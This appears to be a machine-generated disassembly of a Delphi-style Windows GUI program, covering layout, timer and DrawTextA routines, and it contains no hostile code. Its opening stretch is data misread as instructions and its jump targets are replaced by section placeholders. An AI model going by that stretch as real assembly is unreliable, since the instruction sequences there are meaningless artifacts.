jb r-xdata
outsd
outsb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0017 ] al
je r-xdata
je r-xdata
xchg esp eax
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x5f00ffff ] ah
cmp eax 0x3dc40044
inc esp
add [ eax ] al
add [ eax ] al
insb
cmp [ gs : esi - 0x2b7bffbd ] al
inc ebx
add [ esp + edx * 8 - 0xb8bffbd ] dh
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070015 ] al
popad
jo r-xdata
inc edx
add [ esi ] al
push esp
push eax
popad
outsb
insb
nop
adc al dl
inc edx
add [ edi ] al
push es
push esp
push eax
popad
outsb
insb
cmp bh cl
inc edx
add ah al
into
inc edx
add [ edx ] al
or [ ebp + 0x78 ] al
je r-xdata
xchg [ ebx ] al
popad
add [ eax ] al
add [ ebx ] dl
add [ ebx ] cl
inc edx
outsd
jb r-xdata
insb
dec edi
jne r-xdata
[ 0x1ff0002 ]
jae r-xdata
outsb
test [ fs : ebx ] eax
add [ edx ] bh
add bh bh
jpe r-xdata
inc ebx
jne r-xdata
xor eax [ eax + eax + 0x10 ]
inc eax
add [ edi - 0xb00ffff ] ah
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] eax
push cs
push ebp
jae r-xdata
imul ebp [ edi + 0x6e ] sub_41c110
jo r-xdata
imul esp [ edi + 0x6e ] 0x746e656d
nop
je r-xdata
add [ eax ] al
call [ esi ]
jb r-xdata
sbb al 0x2
add bh bh
dec eax
in eax dx
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jb r-xdata
imul ecx [ ebp + 0x6f ] 0x10006564
inc eax
add [ ebp + ecx * 2 + 0xbc0044 ] ch
add dh bh
pop ds
add al [ eax ]
inc [ eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50100023 ] al
popad
insb
push edx
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop ds
add [ ebx ] cl
inc esi
jne r-xdata
add bh bh
sbb eax 0x1ff0002
jb r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
add [ eax ] al
inc esp
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
add [ 0x6f6c6f43 ] al
jb r-xdata
add bh bh
and al 0xd6
inc ebx
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push cs
add [ eax ] cl
inc ecx
jne r-xdata
pop esp
add [ eax ] al
insb
jae r-xdata
add [ eax ] 0x0
add [ eax + 0x43050018 ] al
je r-xdata
xchg [ ebx ] eax
je r-xdata
add [ eax - 0x2a ] al
inc ebx
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add bh bh
push ss
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
inc ebx
add [ edx ] dl
add al [ eax ]
push esp
in al dx
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
adc [ eax ] al
or al [ edx + 0x65 ]
jbe r-xdata
xchg esp eax
inc ebx
add [ edx + eax ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ es : edx ] cl
outsb
je r-xdata
outsb
imul ebp [ esi + 0x74 ] r-xdata
push 0x78ff0000
aad 0x43
add [ eax + 0x43d5 ] cl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040020 ] al
outsd
outsb
je r-xdata
add [ eax - 0xc ] al
sbb eax [ eax ]
or al [ edx + esi * 2 + 0x61 ]
sbb al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
test [ ebx ] eax
fwait
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
sbb al [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
push eax
jg r-xdata
adc [ eax ] al
test al 0x1
add bh bh
cmp al 0x28
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al 0x0
or [ ecx + 0x6c ] eax
add [ eax + 0x7f ] ch
inc ebx
add [ ebx ] bl
add bh bh
cwde
leave
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
int3
add bh bh
dec esp
stc
inc ebx
add [ ecx ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
outsb
add [ ecx ] 0x0
add [ eax ] al
popad
arpl [ ebx + 0x67 ] bp
jb r-xdata
add [ eax ] al
add [ eax ] al
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
lodsb [ esi ]
dec ebp
inc esp
add [ eax + eax + 0x21ffe00 ] bh
add bh bh
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax [ eax ]
adc [ eax + 0x61 ] dl
adc [ eax ] al
push ds
add al [ eax ]
[ esi ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] eax
push es
dec esp
outsd
arpl [ ebx + 0x65 ] bp
add [ fs : eax ] dl
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al [ eax ]
push cs
push eax
popad
jb r-xdata
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
imul ebp [ esi + 0x74 ] r-xdata
cld
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] al
outsb
je r-xdata
je r-xdata
jne r-xdata
add [ ecx ] 0x0
add [ eax ] al
daa
add [ esi ] cl
outsb
je r-xdata
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
outsb
movsb [ edi ] [ esi ]
rol [ ebx ] cl
hlt
jo r-xdata
adc [ eax ] al
0xf8ff0000 0x43d5
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
popad
jb r-xdata
push cs
je r-xdata
inc esi
and al 0x0
or edx [ eax + 0x61 ]
jb r-xdata
add [ fs : eax ] dl
inc eax
add [ edx ] bl
add bh bh
dec eax
salc
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
outsb
je r-xdata
push eax
popad
jb r-xdata
add [ edx ] cl
outsd
insb
outsd
jb r-xdata
movsb [ edi ] [ esi ]
add [ eax ] eax
call [ esi + edi + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
outsb
jne r-xdata
jo r-xdata
outsd
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
mov al 0xd5
inc ebx
add [ ecx ] al
cmp eax 0x3e7c0044
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
push 0x6948776f
outsb
je r-xdata
and eax 0x61500b00
adc [ eax ] al
test eax 0xd0ff0001
cmp eax 0x10044
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
adc [ eax ] al
push edi
add [ eax ] al
jmp [ ebx + edx * 8 - 0xb0bffbd ]
adc [ eax ] al
cdq
add [ eax ] al
call esp
aad 0x43
add [ ebp + edx * 8 + 0x43 ] bl
jb r-xdata
add [ ebx ] cl
push eax
popad
leave
inc esp
add [ eax + eax ] bh
sub_42dfd8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx - 0x4 ]
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_41e36c
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_41eaf4
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_41e36c
dec [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_41eaf4
pop ebx
mov esp ebp
pop ebp
retn
sub_42e09c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx 0x1
call sub_41e478
mov eax [ ebp - 0x4 ]
dec [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
dec [ eax + 0x8 ]
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
inc [ eax + 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
dec ebx
push ebp
call sub_42dfd8
pop ecx
push 0xffffffff
push 0xffffffff
mov eax [ ebp - 0x4 ]
push eax
call InflateRect
test ebx ebx
jg r-xdata
sub_42e0fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_444df4
mov eax [ ebx + 0x50 ]
or eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_420dc8
mov esi eax
mov [ ebx + 0x168 ] esi
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] sub_42e540
mov [ esi + 0x24 ] ebx
mov eax ebx
mov dx 0xffc7
call sub_403338
mov [ esi + 0x20 ] eax
mov edx 0x69
mov eax ebx
call sub_43cc64
mov edx 0x69
mov eax ebx
call sub_43cc40
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_42e194
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov eax [ esi + 0x168 ]
call sub_403124
mov edx ebx
and dl 0xfc
mov eax esi
call sub_444e50
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_42e1e0
push ebx
push esi
push edi
push ebp
add esp 0xffffffe8
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x168 ]
call sub_4213e0
mov esi eax
mov eax [ ebx + 0x168 ]
call sub_4213f8
mov edi eax
mov eax ebx
call sub_43ce88
mov [ esp ] eax
mov eax ebx
call sub_43cecc
mov [ esp + 0x4 ] eax
cmp [ ebx + 0x178 ] 0x0
jne r-xdata
cmp [ ebx + 0x17d ] 0x0
je r-xdata
cmp [ ebx + 0x17d ] 0x0
je r-xdata
mov esi [ esp ]
mov edi [ esp + 0x4 ]
test esi esi
jle r-xdata
xor eax eax
mov [ ebp ] eax
xor eax eax
mov [ ebp + 0x4 ] eax
mov [ ebp + 0x8 ] esi
mov [ ebp + 0xc ] edi
cmp [ ebx + 0x179 ] 0x0
je r-xdata
cmp esi [ esp ]
jg r-xdata
add esp 0x18
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
sub eax edi
sar eax 0x1
jns r-xdata
test edi edi
jle r-xdata
cmp edi [ esp + 0x4 ]
jle r-xdata
push eax
mov eax [ esp + 0x4 ]
sub eax esi
sar eax 0x1
jns r-xdata
adc eax 0x0
mov [ esp + 0x10 ] esi
fild [ esp + 0x10 ]
mov [ esp + 0x14 ] edi
fild [ esp + 0x14 ]
fdivp st1
fstp [ esp + 0x8 ]
fwait
cmp edi esi
jge r-xdata
push eax
push ebp
call OffsetRect
adc eax 0x0
mov edi [ esp + 0x4 ]
fild [ esp + 0x4 ]
fmul [ esp + 0x8 ]
call sub_402944
mov esi eax
cmp esi [ esp ]
jle r-xdata
mov esi [ esp ]
fild [ esp ]
fdiv [ esp + 0x8 ]
call sub_402944
mov edi eax
cmp edi [ esp + 0x4 ]
jle r-xdata
mov esi [ esp ]
fild [ esp ]
fdiv [ esp + 0x8 ]
call sub_402944
mov edi eax
jmp r-xdata
mov edi [ esp + 0x4 ]
fild [ esp + 0x4 ]
fmul [ esp + 0x8 ]
call sub_402944
mov esi eax
jmp r-xdata
sub_42e30c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x17c ]
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov [ eax + 0x17c ] 0x1
xor eax eax
push ebp
push sub_42e3bd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x160 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_42e1e0
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x168 ]
mov ecx [ eax + 0xc ]
mov eax ebx
call sub_41eb74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e3c4
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x17c ] dl
retn
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x160 ]
mov eax [ ebx + 0x10 ]
mov dl 0x1
call sub_41e448
mov eax [ ebx + 0x14 ]
mov dl 0x1
call sub_41e768
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
xor ecx ecx
xor edx edx
mov eax ebx
call sub_41eb2c
sub_42e3cc
push ebx
push esi
push edi
push ebp
mov ebp eax
xor ebx ebx
mov eax [ ebp + 0x168 ]
mov esi [ eax + 0xc ]
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x1
jne r-xdata
test esi esi
je r-xdata
cmp [ esi + 0x22 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
jne r-xdata
mov eax ebp
call sub_454618
mov edi eax
test edi edi
je r-xdata
mov [ esi + 0x22 ] 0x0
jmp r-xdata
cmp [ edi + 0x22e ] 0x0
je r-xdata
mov eax edi
call sub_443f64
test al al
je r-xdata
cmp [ ebp + 0x17c ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x30f
mov eax edi
call sub_443c60
push eax
call PostMessageA
push 0x0
xor ecx ecx
mov edx 0x30f
mov eax edi
call sub_43e62c
jmp r-xdata
mov bl 0x1
mov [ esi + 0x22 ] 0x0
sub_42e464
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov edi edx
mov esi eax
mov ebx [ ebp + 0x10 ]
test [ esi + 0x17a ] bl
je r-xdata
cmp [ esi + 0x172 ] 0x0
je r-xdata
mov eax esi
call sub_42e3cc
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
mov al [ ebp + 0x14 ]
push eax
push ebx
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov edx edi
mov eax [ esi + 0x174 ]
call [ esi + 0x170 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x8c ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x88 ]
jmp r-xdata
sub_42e540
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov eax [ ebx + 0x168 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov eax [ ebx + 0x168 ]
call sub_4213e0
test eax eax
jle r-xdata
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax esi
mov edx [ r-xdata ]
call sub_4032b0
test al al
jne r-xdata
mov eax [ ebx + 0x168 ]
call sub_4213f8
test eax eax
jle r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov edx esp
mov eax ebx
call sub_42e1e0
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032b0
test al al
jne r-xdata
mov eax [ ebx + 0x168 ]
call sub_4213e0
push eax
mov eax [ ebx + 0x168 ]
call sub_4213f8
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
cmp [ esp ] 0x0
jg r-xdata
mov dl [ ebx + 0x17b ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebx + 0x17c ] 0x0
jne r-xdata
cmp [ ebx + 0x17c ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
jg r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
jmp r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ ebx + 0x48 ]
jl r-xdata
mov eax [ esp + 0xc ]
cmp eax [ ebx + 0x4c ]
jl r-xdata
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
call sub_42e3cc
test al al
je r-xdata
sub_42e668
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov esi eax
mov bl 0x1
test [ esi + 0x1c ] 0x10
je r-xdata
mov al [ esi + 0x5b ]
test al al
je r-xdata
mov eax [ esi + 0x168 ]
call sub_4213e0
test eax eax
jle r-xdata
mov eax [ esi + 0x168 ]
call sub_4213e0
mov [ edi ] eax
add al 0xfd
sub al 0x2
jae r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x168 ]
call sub_4213f8
test eax eax
jle r-xdata
mov eax [ esi + 0x168 ]
call sub_4213f8
mov [ ebp ] eax
mov al [ esi + 0x5b ]
sub al 0x3
jae r-xdata
sub_42e6d0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41aa7c
mov [ esi + 0x40 ] 0x1
mov [ esi + 0x30 ] 0x3e8
push esi
push sub_42e758
call sub_41bbc8
mov [ esi + 0x34 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax esi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_42e720
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov [ esi + 0x40 ] 0x0
mov eax esi
call sub_42e7cc
mov eax [ esi + 0x34 ]
call sub_41bc7c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41aac8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_42e758
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov esi [ ebx ]
cmp esi 0x113
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
call DefWindowProcA
mov [ ebx + 0xc ] eax
xor eax eax
push ebp
push sub_42e792
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403320
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42e7cc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_42e84b
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call KillTimer
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e852
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
cmp [ ebx + 0x40 ] 0x0
je r-xdata
cmp [ ebx + 0x3a ] 0x0
je r-xdata
push 0x0
push esi
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call SetTimer
test eax eax
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
sub_42e8a4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_445874
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
call sub_4335f0
call sub_4336d0
test al al
je r-xdata
add esp 0xfffffff0
call sub_403448
mov edx 0xb9
mov eax esi
call sub_43cc40
mov edx 0x29
mov eax esi
call sub_43cc64
mov [ esi + 0x220 ] 0x2
mov dl 0x2
mov eax esi
call sub_42ecf4
mov edx 0x1
mov eax esi
call sub_42ed10
mov [ esi + 0x21c ] 0x0
mov edx 0xff00000f
mov eax esi
call sub_43d624
mov [ esi + 0x21d ] 0x1
mov dl 0x1
mov eax esi
call sub_443ef4
mov eax esi
test bl bl
je r-xdata
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov edx [ r-xdata ]
not edx
and edx eax
mov [ esi + 0x50 ] edx
mov eax esi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_42e968
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_440aec
xor eax eax
mov al [ ebx + 0x21c ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
and [ esi + 0x24 ] 0xfffffffc
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x21c ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_42e9d8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_443278
pop esi
pop ebx
retn
cmp [ ebx + 0x21c ] 0x1
jne r-xdata
mov eax ebx
call sub_441200
sub_42ea18
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42eb08
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x21d ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_43d484
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
call sub_44213c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42eb0f
lea eax [ ebp - 0x14 ]
call sub_403ef8
retn
mov esi [ ebx + 0x218 ]
cmp [ ebx + 0x211 ] 0x0
je r-xdata
cmp [ ebx + 0x212 ] 0x0
je r-xdata
add esi [ ebx + 0x214 ]
test esi esi
jle r-xdata
add esi [ ebx + 0x214 ]
mov eax [ ebx + 0x48 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x4 ] eax
mov eax [ edi + 0x8 ]
mov eax [ eax + 0x10 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
mov eax [ edi + 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
sub eax esi
dec eax
mov [ ebp - 0x10 ] eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_443c60
push eax
call InvalidateRect
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
sub eax esi
dec eax
mov [ ebp - 0xc ] eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_443c60
push eax
call InvalidateRect
sub_42eb18
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] 0xff000014
cmp al 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] 0xff000010
cmp al 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] 0xff000010
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xff000014
sub_42eb50
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_42ecb2
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov al [ ebx + 0x212 ]
test al al
je r-xdata
mov eax [ ebx + 0x70 ]
push eax
mov edx [ ebx + 0x218 ]
push edx
lea edx [ ebp - 0x18 ]
mov ecx eax
mov eax [ ebx + 0x208 ]
call sub_42e09c
mov al [ ebx + 0x211 ]
test al al
je r-xdata
push ebp
call sub_42eb18
pop ecx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x214 ]
push eax
lea edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x208 ]
call sub_42e09c
mov esi [ ebx + 0x208 ]
call sub_4335f0
call sub_4336d0
test al al
je r-xdata
push ebp
call sub_42eb18
pop ecx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x214 ]
push eax
lea edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x208 ]
call sub_42e09c
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_41e64c
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_41e9f0
mov eax ebx
call sub_444dac
test al al
jne r-xdata
mov [ ebp - 0x14 ] edx
add eax edx
mov [ ebp - 0xc ] eax
xor eax eax
mov al [ ebx + 0x220 ]
mov edi [ eax * 4 + rw-data ]
or edi 0x44
mov edx edi
mov eax ebx
call sub_43f758
mov edi eax
push edi
lea eax [ ebp - 0x18 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_43d484
mov eax [ ebp - 0x1c ]
call sub_4043b8
push eax
mov eax esi
call sub_41ed94
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ecb9
lea eax [ ebp - 0x1c ]
call sub_403ef8
retn
adc edx 0x0
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_41e768
mov edx [ ebx + 0x68 ]
mov eax esi
call sub_41ecb4
mov edx r-xdata
mov eax esi
call sub_41ec10
mov edx [ ebp - 0xc ]
add edx [ ebp - 0x14 ]
sub edx eax
sar edx 0x1
jns r-xdata
sub_42ed64
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43fccc
mov eax [ ebx + 0x218 ]
neg eax
push eax
mov edx [ ebx + 0x218 ]
neg edx
push eax
push esi
call InflateRect
xor eax eax
cmp [ ebx + 0x212 ] 0x0
je r-xdata
cmp [ ebx + 0x211 ] 0x0
